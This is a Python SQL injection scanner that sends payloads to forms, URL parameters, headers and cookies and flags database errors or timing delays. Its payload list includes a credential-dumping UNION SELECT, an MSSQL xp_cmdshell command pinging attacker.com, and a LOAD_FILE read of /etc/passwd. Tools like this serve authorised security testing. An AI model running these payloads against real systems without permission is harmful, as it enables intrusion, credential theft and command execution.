import requests
from bs4 import BeautifulSoup
import time
import string

class AdvancedSQLiScanner:
    def __init__(self):
        self.sql_errors = {
            'generic': [
                'SQL syntax', 'syntax error', 'unclosed quotation',
                'unterminated quoted string', 'quoted string not properly terminated'
            ],
            'mysql': [
                'mysql_fetch', 'mysqli_', 'MySQL server version',
                'for the right syntax to use near', 'You have an error in your SQL syntax'
            ],
            'mssql': [
                'Microsoft SQL Server', 'System.Data.SqlClient',
                'Incorrect syntax near', 'Unclosed quotation mark'
            ],
            'postgresql': [
                'PostgreSQL', 'pg_exec', 'pg_query',
                'syntax error at or near', 'unterminated quoted string'
            ],
            'oracle': [
                'ORA-00933', 'ORA-01756', 'ORA-00936',
                'Oracle error', 'PLS-00306'
            ]
        }
        self.payloads = self._generate_payloads()
        self.header_safe_payloads = self._generate_header_safe_payloads()
        self.session = requests.Session()
        self.time_based_threshold = 5  # Seconds for time-based detection
        self.session.headers.update({'User-Agent': 'SQLiScanner/1.0'})
        
    def _determine_severity(self, payload, response):
        """Dynamic severity assessment"""
        if 'UNION' in payload or 'xp_cmdshell' in payload:
            return 'Critical'  # Direct data access/OS command
        if 'SLEEP' in payload or 'BENCHMARK' in payload:
            return 'High'      # Time-based blind
        if 'OR 1=1' in payload:
            return 'Medium'    # Basic bypass
        return 'Low'

    def _get_evidence(self, payload, response):
        """Specific evidence description"""
        if any(err in response.text for err in self.sql_errors['generic']):
            return "Generic SQL error detected"
        if 'SLEEP' in payload and response.elapsed.total_seconds() > 5:
            return "Time delay detected (5+ seconds)"
        if 'UNION' in payload and 'NULL' in response.text:
            return "Union-based injection successful"
        return "Anomalous server response"
    
    def _create_vulnerability(self, form_details, payload, response):
        return {
            'form_action': form_details['action'] or 'Same Page',
            'form_method': form_details['method'],
            'parameters': [input['name'] for input in form_details['inputs']],
            'payload': payload,
            'type': 'Form',
            'severity': self._determine_severity(payload, response),
            'evidence': self._get_evidence(payload, response),
            'confidence': self._get_confidence_level(response),
            'database_type': self._identify_dbms(response.text),
            'response_sample': response.text[:200] + "..." if response.text else None
        }

    def _get_confidence_level(self, response):
        """Confidence based on clear error messages"""
        if any(err in response.text for err in self.sql_errors['mysql']):
            return "Certain (MySQL errors detected)"
        if "SQL syntax" in response.text:
            return "High (Generic SQL errors)"
        return "Medium (Behavioral detection)"
    
    def _identify_dbms(self, response_text):
        """Identify database from errors"""
        for db_type, errors in self.sql_errors.items():
            if db_type != 'generic' and any(err in response_text for err in errors):
                return db_type.upper()
        return "Unknown"

    def scan(self, url):
        results = []
        
        try:
            # Test URL parameters
            if '?' in url:
                results += self._test_get_parameters(url)
            
            # Test forms
            results += self._test_forms(url)
            
            # Test headers and cookies
            results += self._test_headers(url)
            results += self._test_cookies(url)
            
        except Exception as e:
            print(f"Scan error: {str(e)}")
        
        return results

    def _test_forms(self, url):
        results = []
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_details = self._parse_form(form)
                for payload in self.payloads:
                    # Get response from form submission
                    submission_response, response_time = self._submit_form(form_details, payload, url)
                    if submission_response and self._analyze_response(submission_response, payload, response_time):
                        results.append(self._create_vulnerability(form_details, payload, submission_response))
        except Exception as e:
            print(f"Form test error: {str(e)}")
        return results

    def _parse_form(self, form):
        details = {
            'action': form.get('action'),
            'method': form.get('method', 'get').upper(),
            'inputs': [],
            'headers': {}
        }
        
        for input_tag in form.find_all('input'):
            if input_tag.get('type') in ['hidden', 'csrf']:
                details['inputs'].append({
                    'name': input_tag.get('name'),
                    'value': input_tag.get('value', ''),
                    'type': input_tag.get('type')
                })
        
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            if input_tag.name == 'select':
                options = input_tag.find_all('option')
                value = options[0].get('value') if options else ''
                details['inputs'].append({
                    'name': input_tag.get('name'),
                    'value': value,
                    'type': 'select'
                })
            else:
                details['inputs'].append({
                    'name': input_tag.get('name'),
                    'value': input_tag.get('value', ''),
                    'type': input_tag.get('type', 'text')
                })
        
        return details

    def _submit_form(self, form_details, payload, base_url):
        try:
            target_url = form_details['action'] if form_details['action'] else base_url
            data = {}
            
            for input_field in form_details['inputs']:
                if input_field['type'] in ['hidden', 'csrf']:
                    data[input_field['name']] = input_field['value']
                else:
                    data[input_field['name']] = payload

            start_time = time.time()
            if form_details['method'] == 'GET':
                response = self.session.get(target_url, params=data)
            else:
                response = self.session.post(target_url, data=data)
            response_time = time.time() - start_time

            return response, response_time
        except Exception as e:
            print(f"Form submit error: {str(e)}")
            return None, 0

    def _generate_payloads(self):
        return [
            # Basic payloads
            "' OR '1'='1",
            "' OR 1=1--",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--",
            
            # Time-based
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(5000000,MD5('test'))--",
            
            # Error-based
            "' AND 1=CONVERT(int,(SELECT CURRENT_USER))--",
            
            # Boolean-based blind
            "' OR 1=1 AND 'a'='a",
            "' OR 1=2 AND 'a'='b",
            
            # Database-specific
            "'; EXEC xp_cmdshell('ping attacker.com')--",  # MSSQL
            "'||(SELECT LOAD_FILE('/etc/passwd'))||'",     # MySQL
        ]

    def _generate_header_safe_payloads(self):
        return [
            p for p in self.payloads 
            if not any(c in p for c in ['\n', '\r', '\x00'])
        ]

    def _analyze_response(self, response, payload, response_time):
        try:
            # Check for errors
            for db_type, errors in self.sql_errors.items():
                if any(error in response.text for error in errors):
                    return True
            
            # Check for time delays
            if 'SLEEP' in payload or 'BENCHMARK' in payload:
                if response_time >= self.time_based_threshold:
                    return True
            
            return False
        except Exception as e:
            print(f"Analysis error: {str(e)}")
            return False

    def _test_get_parameters(self, url):
        results = []
        try:
            parsed_url = requests.utils.urlparse(url)
            params = requests.utils.parse_qs(parsed_url.query)
            
            for param in params:
                for payload in self.payloads:
                    test_url = url.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={payload}"
                    )
                    try:
                        response = self.session.get(test_url)
                        if self._analyze_response(response, payload, 0):
                            results.append({
                                'parameter': param,
                                'payload': payload,
                                'type': 'GET parameter',
                                'severity': 'Critical'
                            })
                    except Exception as e:
                        print(f"GET param error: {str(e)}")
        except Exception as e:
            print(f"GET test error: {str(e)}")
        return results

    def _test_headers(self, url):
        results = []
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        try:
            for header in headers_to_test:
                for payload in self.header_safe_payloads:
                    if self._is_valid_header_value(payload):
                        headers = {header: payload}
                        try:
                            response = self.session.get(url, headers=headers)
                            if self._analyze_response(response, payload, 0):
                                results.append({
                                    'parameter': header,
                                    'payload': payload,
                                    'type': 'Header',
                                    'severity': 'High'
                                })
                        except requests.exceptions.InvalidHeader:
                            continue
        except Exception as e:
            print(f"Header test error: {str(e)}")
        return results

    def _test_cookies(self, url):
        results = []
        try:
            for cookie_name in self.session.cookies.keys():
                for payload in self.header_safe_payloads:
                    self.session.cookies.set(cookie_name, payload)
                    try:
                        response = self.session.get(url)
                        if self._analyze_response(response, payload, 0):
                            results.append({
                                'parameter': cookie_name,
                                'payload': payload,
                                'type': 'Cookie',
                                'severity': 'High'
                            })
                    except Exception as e:
                        print(f"Cookie test error: {str(e)}")
        except Exception as e:
            print(f"Cookie test error: {str(e)}")
        return results

    def _is_valid_header_value(self, value):
        allowed_chars = set("!#$%&'*+-.^_`|~") | set(string.digits) | set(string.ascii_letters)
        allowed_chars.update(' :;<=>?@[]{}')
        return all(c in allowed_chars for c in value)

if __name__ == "__main__":
    scanner = AdvancedSQLiScanner()
    target_url = "http://localhost/vulnerable-app/login.php"  # Update with your test URL
    results = scanner.scan(target_url)
    
    if results:
        print("\nFound vulnerabilities:")
        for i, vuln in enumerate(results, 1):
            print(f"{i}. Type: {vuln['type']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Severity: {vuln['severity']}")
            print(f"   Evidence: {vuln['evidence']}")
            print("   " + "-"*50)
    else:
        print("No vulnerabilities found")